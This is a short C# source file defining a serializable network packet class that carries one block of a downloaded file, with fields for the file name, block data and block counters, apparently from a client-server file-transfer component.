using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class DoDownloadFileResponse : IPacket
    {
        public int ID { get; set; }

        public string Filename { get; set; }

        public byte[] Block { get; set; }

        public int MaxBlocks { get; set; }

        public int CurrentBlock { get; set; }

        public string CustomMessage { get; set; }

        public DoDownloadFileResponse()
        {
        }

        public DoDownloadFileResponse(int id, string filename, byte[] block, int maxblocks, int currentblock,
            string custommessage)
        {
            this.ID = id;
            this.Filename = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
            this.CustomMessage = custommessage;
        }

        public void Execute(Client client)
        {
            client.SendBlocking(this);
        }
    }
}